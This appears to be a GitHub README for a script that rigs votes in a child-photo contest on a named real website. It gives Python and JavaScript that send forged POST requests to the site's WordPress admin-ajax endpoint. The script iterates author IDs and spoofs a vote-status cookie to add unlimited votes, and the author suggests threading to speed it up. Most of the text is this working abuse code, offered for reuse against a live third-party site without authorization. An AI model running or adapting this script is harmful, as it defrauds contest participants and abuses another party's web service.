# vote increaser on a site

**Site_url: [https://little1.in/]**

This is test user => [https://little1.in/contest/madhav-sethi-aam-ke-peti-3857/]

this site is a spam site which get trafic by a some child photos compitition
so i hack its database api - because it have some loopholes 
1: **it provides a ajax code in html file**
```bash
var data = {
 'action': 'vote_form_data',
 'contestid': contestid,
 'authorid': authorid,
  'name': name
}
jQuery.ajax({
  url:"https://little1.in/wp-admin/admin-ajax.php",
	type: 'POST',
	data: data}
```
**next**
just to figure out the **contestid,authorid,name** values to send post request 

it turns out that **name = ''** blank here and

**contestid** is in the end of the url itself 

so just to get **authorid** 
which is provided in html tag

<img src="https://github.com/rishabhjainfinal/vote_increaser_on_a_site/blob/master/Screenshot%20(68).png" >

SO FOR EACH VOTE YOU HAVE TO ADD +1 IN YOUR **authorid**  ALTHOUGH IT ALSO ADD A VOTE WHEN REQUESTED FROM SAME **authorid**   ¯\\_(ツ)_/¯ 

***next***

and then i make a simple script to fetch current votes 
```bash
def votes(url):
	source = urllib.request.urlopen(url).read()
	soup = bs.BeautifulSoup(source,features="html.parser")
	for i in soup.select('div.blog-item'):
		votes=i.p.strong.text
	return votes

```

you can also use **threading** to get things faster and more excited jsut un-comment all the threading lines code and comment the the increaser call funtion you will see it when you see the file
i don't have the power and internet speed to do but i tested it wooks fine 

```bash
def increaser(n):
	database_url = "https://little1.in/wp-admin/admin-ajax.php"
	contestid=url.split('/')[-2].split('-')[-1]

	payload = f'action=vote_form_data&contestid={contestid}&authorid={n}&name='
	headers = {
	  'Content-Type': 'application/x-www-form-urlencoded',
	  'Cookie': 'sitename_newvisitor=1; voteStatus-4233=4233'
	}

	response = requests.request("POST", database_url, headers=headers, data = payload)
```

this funtion will send request to the databasse of site and take **contestid** as arg 

**thats all**
we spam the spamer


all the require modues are here install them by pip install {module name}
```bash
requests
bs4
urllib.request
threading
```

**sucess example**

<img style='display:block' src="https://github.com/rishabhjainfinal/vote_increaser_on_a_site/blob/master/Screenshot%20(69).png" >
